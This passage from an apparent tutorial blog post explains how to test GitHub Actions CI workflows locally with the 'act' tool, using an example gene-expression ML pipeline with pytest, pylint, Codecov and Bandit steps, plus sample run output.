<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">jobs</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">unit-tests</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">runs-on</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ubuntu</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">steps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> pytest tests/unit/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">integration-tests</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">runs-on</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ubuntu</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">steps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> pytest tests/integration/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">lint</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">runs-on</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ubuntu</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">steps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> pylint src/</span><br></span></code></pre></div></div>
<p><strong>Sequential time:</strong> 30s + 40s + 10s = 80s
<strong>Parallel time (--parallel 3):</strong> ~40s</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-use-act--l-list-mode">4. Use <code>act -l</code> (List) Mode<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#4-use-act--l-list-mode" class="hash-link" aria-label="Direct link to 4-use-act--l-list-mode" title="Direct link to 4-use-act--l-list-mode" translate="no">​</a></h3>
<p>For quick workflow checks without running:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--list</span><br></span></code></pre></div></div>
<p>Shows all jobs without executing them.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-rebuild-docker-image">5. Rebuild Docker Image<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#5-rebuild-docker-image" class="hash-link" aria-label="Direct link to 5. Rebuild Docker Image" title="Direct link to 5. Rebuild Docker Image" translate="no">​</a></h3>
<p>Cache can become stale. Rebuild:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act --reuse-containers  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Reuse running containers</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rebuild</span><span class="token plain">            </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Rebuild image from scratch</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="real-example-bioinformatics-gene-expression-pipeline">Real Example: Bioinformatics Gene Expression Pipeline<a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#real-example-bioinformatics-gene-expression-pipeline" class="hash-link" aria-label="Direct link to Real Example: Bioinformatics Gene Expression Pipeline" title="Direct link to Real Example: Bioinformatics Gene Expression Pipeline" translate="no">​</a></h2>
<p>Let's build a complete ML pipeline workflow and test it locally with <code>act</code>.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="workflow-file-githubworkflowsml-pipelineyml">Workflow File: <code>.github/workflows/ml-pipeline.yml</code><a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#workflow-file-githubworkflowsml-pipelineyml" class="hash-link" aria-label="Direct link to workflow-file-githubworkflowsml-pipelineyml" title="Direct link to workflow-file-githubworkflowsml-pipelineyml" translate="no">​</a></h3>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ML Pipeline </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> Gene Expression Analysis</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">on</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">push</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">branches</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">main</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> develop</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">pull_request</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">branches</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">main</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">jobs</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">runs-on</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ubuntu</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">strategy</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">matrix</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">python-version</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">'3.10'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'3.11'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'3.12'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">steps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Checkout code</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">uses</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> actions/checkout@v3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Set up Python $</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> matrix.python</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">version </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">uses</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> actions/setup</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">python@v4</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">with</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">python-version</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> $</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> matrix.python</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">version </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Cache pip packages</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">uses</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> actions/cache@v3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">with</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ~/.cache/pip</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">key</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> $</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> runner.os </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">pip</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">$</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> matrix.python</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">version </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">$</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> hashFiles('</span><span class="token important" style="color:hsl(230, 8%, 24%);font-weight:bold">**/requirements.txt')</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Install dependencies</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token scalar string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          python -m pip install --upgrade pip</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          pip install -r requirements.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          pip install pytest pytest-cov pytest-xdist</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Lint with pylint</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> pylint src/ </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">exit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">zero</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">continue-on-error</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token boolean important" style="color:hsl(230, 8%, 24%);font-weight:bold">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Run unit tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> pytest tests/unit/ </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">v </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">cov=src </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">cov</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">report=xml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Run integration tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> pytest tests/integration/ </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">v</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Upload coverage reports</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">uses</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> codecov/codecov</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">action@v3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">if</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> matrix.python</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">version == '3.12'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">with</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ./coverage.xml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">          </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">flags</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> unittests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">security</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">runs-on</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> ubuntu</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain">latest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">steps</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">uses</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> actions/checkout@v3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">      </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">name</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> Run Bandit security check</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">|</span><span class="token scalar string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          pip install bandit</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token scalar string" style="color:hsl(119, 34%, 47%)">          bandit -r src/ -v --exit-code 0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">continue-on-error</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token boolean important" style="color:hsl(230, 8%, 24%);font-weight:bold">true</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="running-locally-with-act">Running Locally with <code>act</code><a href="https://riverxdata.github.io/river-docs/blog/cicd-bioinformatics-act-local-github-action#running-locally-with-act" class="hash-link" aria-label="Direct link to running-locally-with-act" title="Direct link to running-locally-with-act" translate="no">​</a></h3>
<p><strong>Run all jobs:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">act push</span><br></span></code></pre></div></div>
<p><strong>Expected output:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[ML Pipeline - Gene Expression Analysis/test] 🚀 Start image pull...</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[ML Pipeline - Gene Expression Analysis/test] ⭐ Run actions/checkout@v3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[ML Pipeline - Gene Expression Analysis/test] ✓ Step 'Checkout code' completed</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[ML Pipeline - Gene Expression Analysis/test] ⭐ Run Set up Python 3.10</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[ML Pipeline - Gene Expression Analysis/test] ✓ Step 'Set up Python 3.10' completed</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[ML Pipeline - Gene Expression Analysis/test] ⭐ Run Install dependencies</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[ML Pipeline - Gene Expression Analysis/test] ✓ Step 'Install dependencies' completed</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[ML Pipeline - Gene Expression Analysis/test] ⭐ Run Run unit tests</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">...</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[ML Pipeline - Gene Expression Analysis/test] ✓ Complete job</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[ML Pipeline - Gene Expression Analysis/security] ⭐ Run Bandit security check</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[ML Pipeline - Gene Expression Analysis/security] ✓ Complete job</span><br></span></code></pre></div></div>
<p><strong>Run specific Python version:</strong></p>
